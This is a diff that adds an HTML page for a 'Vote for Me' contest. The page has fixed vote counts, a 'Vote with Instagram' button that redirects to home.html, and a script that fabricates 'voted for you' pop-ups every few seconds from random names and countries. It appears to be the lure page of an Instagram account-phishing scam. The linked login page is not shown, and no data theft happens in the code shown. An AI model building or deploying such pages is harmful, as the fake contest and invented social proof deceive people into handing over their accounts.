@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Vote for Me Contest</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  }
+
+  body {
+    height: 100vh;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+  }
+
+  /* 🎥 VIDEO BACKGROUND */
+  #bgVideo {
+    position: fixed;
+    right: 0;
+    bottom: 0;
+    min-width: 100%;
+    min-height: 100%;
+    object-fit: cover;
+    z-index: -3;
+  }
+
+  /* 🖼️ IMAGE BACKUP */
+  #bgImage {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    background: url("https://i.pinimg.com/originals/73/9b/a8/739ba80d857691d58b721a7fb4834ea5.jpg") center/cover no-repeat;
+    z-index: -4;
+  }
+
+  /* 🌫️ DARK OVERLAY */
+  body::before {
+    content: "";
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    background: rgba(10,15,25,0.55);
+    backdrop-filter: blur(3px);
+    z-index: -2;
+  }
+
+  /* 🧊 GLASS CARD */
+  .card {
+    position: relative;
+    z-index: 1;
+    width: 90%;
+    max-width: 430px;
+
+    background: rgba(255,255,255,0.14);
+    border: 1px solid rgba(255,255,255,0.25);
+    backdrop-filter: blur(20px);
+
+    border-radius: 22px;
+    padding: 25px;
+    text-align: center;
+
+    box-shadow: 0 25px 60px rgba(0,0,0,0.35);
+  }
+
+  .title {
+    font-size: 28px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .subtitle {
+    color: rgba(255,255,255,0.85);
+    margin-top: 8px;
+    margin-bottom: 20px;
+    font-size: 14px;
+  }
+
+  .box {
+    background: rgba(255,255,255,0.08);
+    border-radius: 14px;
+    padding: 12px;
+    margin: 10px 0;
+    color: white;
+    border: 1px solid rgba(255,255,255,0.15);
+  }
+
+  /* 🟣 INSTAGRAM BUTTON */
+  .btn {
+    margin-top: 18px;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+
+    color: white;
+    background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+    background-size: 300% 300%;
+    animation: move 6s infinite;
+  }
+
+  @keyframes move {
+    0% {background-position:0% 50%;}
+    50% {background-position:100% 50%;}
+    100% {background-position:0% 50%;}
+  }
+
+  /* 🔔 iOS NOTIFICATIONS */
+  .notif-container {
+    position: fixed;
+    top: 15px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 92%;
+    max-width: 380px;
+    z-index: 999;
+    pointer-events: none;
+  }
+
+  .notif {
+    background: rgba(255,255,255,0.18);
+    border: 1px solid rgba(255,255,255,0.3);
+    backdrop-filter: blur(22px);
+    color: white;
+
+    padding: 12px 14px;
+    margin-top: 10px;
+    border-radius: 18px;
+
+    box-shadow: 0 15px 40px rgba(0,0,0,0.25);
+
+    animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
+  }
+
+  @keyframes slideIn {
+    from { transform: translateY(-40px); opacity: 0; scale: 0.95; }
+    to { transform: translateY(0); opacity: 1; scale: 1; }
+  }
+
+  @keyframes fadeOut {
+    to { opacity: 0; transform: translateY(-30px); }
+  }
+</style>
+</head>
+
+<body>
+
+<!-- 🎥 VIDEO BACKGROUND -->
+<video autoplay muted loop playsinline id="bgVideo">
+  <source src="https://cdn.coverr.co/videos/coverr-city-lights-at-night-5240/1080p.mp4" type="video/mp4">
+</video>
+
+<!-- 🖼️ IMAGE BACKUP -->
+<div id="bgImage"></div>
+
+<!-- 🔔 NOTIFICATIONS -->
+<div class="notif-container" id="notifContainer"></div>
+
+<!-- 🧊 MAIN CARD -->
+<div class="card">
+
+  <div class="title">Vote for Me 🏆</div>
+
+  <div class="subtitle">
+    Contest entry for an online program • Modern global voting system
+  </div>
+
+  <div class="box">Current Votes: <b>462</b></div>
+  <div class="box">Leader Votes: 481</div>
+  <div class="box">You need <b>19 more votes</b> to take the lead</div>
+
+  <button class="btn" onclick="voteWithInstagram()">
+    Vote with Instagram
+  </button>
+
+</div>
+
+<script>
+let names = [
+  "James","Sarah","David","Brooks","John","Sophia","Daniel",
+  "Olivia","Chris","Michel","Matthew","Ava","Liam","Noah",
+  "Chioma","Tobi","Katrin","Zainab","Ethan"
+];
+
+let countries = [
+  "USA","Luxembourg","Canada","Germany","France","corotia",
+  "poland","South Africa","Brazil","austria","Spain",
+  "Italy","Australia","corotia"
+];
+
+function voteWithInstagram() {
+  window.location.href = "home.html";
+}
+/* 🔔 LIVE NOTIFICATIONS */
+function showNotification() {
+  let name = names[Math.floor(Math.random() * names.length)];
+  let country = countries[Math.floor(Math.random() * countries.length)];
+
+  let messages = [
+    `🔔 ${name} from ${country} voted for you`,
+    `🔥 ${name} in ${country} supported your entry`,
+    `👍 Vote received from ${name} (${country})`,
+    `✨ ${name} just voted for your contest entry`
+  ];
+
+  let notif = document.createElement("div");
+  notif.className = "notif";
+  notif.innerText = messages[Math.floor(Math.random() * messages.length)];
+
+  let container = document.getElementById("notifContainer");
+  container.prepend(notif);
+
+  if (container.children.length > 5) {
+    container.removeChild(container.lastChild);
+  }
+
+  setTimeout(() => notif.remove(), 5000);
+}
+
+setInterval(showNotification, 3000);
+showNotification();
+</script>
+
+</body>
+</html>
